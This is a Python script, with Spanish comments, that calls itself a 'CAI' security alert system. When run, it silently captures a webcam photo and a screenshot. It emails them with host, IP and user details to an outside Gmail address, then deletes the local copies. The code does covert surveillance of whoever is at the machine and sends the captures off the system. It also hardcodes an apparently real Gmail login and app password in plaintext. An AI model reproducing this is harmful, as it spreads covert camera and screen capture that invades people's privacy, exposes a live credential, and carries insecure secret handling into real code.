import os
import sys
import smtplib
import socket
import getpass
from datetime import datetime
import cv2
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import platform
import pyautogui

# Configuración SMTP
SMTP_CONFIG = {
    "server": "smtp.gmail.com",
    "port": 587,
    "user": "neritpa@gmail.com",
    "password": "ymwgrjmbwigsrydm",
    "recipient": "fxmspaha@gmail.com"
}

def get_system_info():
    """Obtiene información detallada del sistema"""
    return {
        "hostname": socket.gethostname(),
        "ip": socket.gethostbyname(socket.gethostname()),
        "user": getpass.getuser(),
        "os": f"{platform.system()} {platform.release()}",
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }

def capture_webcam_photo():
    """Captura foto desde la cámara web"""
    try:
        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            ret, frame = cap.read()
            if ret:
                filename = f"webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                cv2.imwrite(filename, frame)
                return filename
        return None
    except Exception as e:
        print(f"Error cámara: {str(e)}", file=sys.stderr)
        return None
    finally:
        if 'cap' in locals():
            cap.release()

def capture_screenshot():
    """Captura pantalla completa"""
    try:
        filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        pyautogui.screenshot(filename)
        return filename
    except Exception as e:
        print(f"Error screenshot: {str(e)}", file=sys.stderr)
        return None

def send_forensic_alert(event_type, user, attachments=[]):
    """Envía alerta por correo con evidencias"""
    sys_info = get_system_info()
    sys_info['user'] = user
    
    # Crear mensaje
    msg = MIMEMultipart()
    msg['From'] = SMTP_CONFIG['user']
    msg['To'] = SMTP_CONFIG['recipient']
    msg['Subject'] = f"ALERTA CAI - {event_type} - {sys_info['hostname']}"
    
    # Cuerpo del mensaje
    body = f"""
    <html>
    <body style="font-family: Arial, sans-serif;">
        <h2 style="color: #d9534f;">Alerta de Seguridad CAI</h2>
        <table border="1" cellpadding="5" style="border-collapse: collapse;">
            <tr style="background-color: #f2f2f2;">
                <th>Campo</th>
                <th>Valor</th>
            </tr>
            <tr>
                <td><strong>Evento</strong></td>
                <td style="color: #d9534f;">{event_type}</td>
            </tr>
            <tr>
                <td><strong>Hostname</strong></td>
                <td>{sys_info['hostname']}</td>
            </tr>
            <tr>
                <td><strong>Dirección IP</strong></td>
                <td>{sys_info['ip']}</td>
            </tr>
            <tr>
                <td><strong>Usuario</strong></td>
                <td>{sys_info['user']}</td>
            </tr>
            <tr>
                <td><strong>Sistema Operativo</strong></td>
                <td>{sys_info['os']}</td>
            </tr>
            <tr>
                <td><strong>Fecha/Hora</strong></td>
                <td>{sys_info['timestamp']}</td>
            </tr>
        </table>
        <p style="margin-top: 20px; color: #777;">
            Este mensaje fue generado automáticamente por el Sistema de Seguridad CAI.
        </p>
    </body>
    </html>
    """
    
    msg.attach(MIMEText(body, 'html'))
    
    # Adjuntar evidencias
    for file in attachments:
        if file and os.path.exists(file):
            with open(file, 'rb') as f:
                if file.endswith('.jpg') or file.endswith('.png'):
                    img = MIMEImage(f.read())
                    img.add_header('Content-Disposition', 'attachment', filename=os.path.basename(file))
                    msg.attach(img)
    
    # Enviar correo
    try:
        with smtplib.SMTP(SMTP_CONFIG['server'], SMTP_CONFIG['port']) as server:
            server.starttls()
            server.login(SMTP_CONFIG['user'], SMTP_CONFIG['password'])
            server.send_message(msg)
        return True
    except Exception as e:
        print(f"Error enviando correo: {str(e)}", file=sys.stderr)
        return False
    finally:
        # Limpiar archivos temporales
        for file in attachments:
            if file and os.path.exists(file):
                os.remove(file)

if __name__ == "__main__":
    if len(sys.argv) >= 3:
        event_type = sys.argv[1]
        user = sys.argv[2]
        
        # Capturar evidencias
        webcam_file = capture_webcam_photo()
        screenshot_file = capture_screenshot()
        
        # Enviar alerta
        attachments = [f for f in [webcam_file, screenshot_file] if f]
        send_forensic_alert(event_type, user, attachments)
        
        # Registrar localmente
        log_entry = f"{datetime.now().isoformat()}|{event_type}|{user}"
        with open("C:\\CAI\\Security\\forensic_log.txt", "a") as log_file:
            log_file.write(log_entry + "\n") 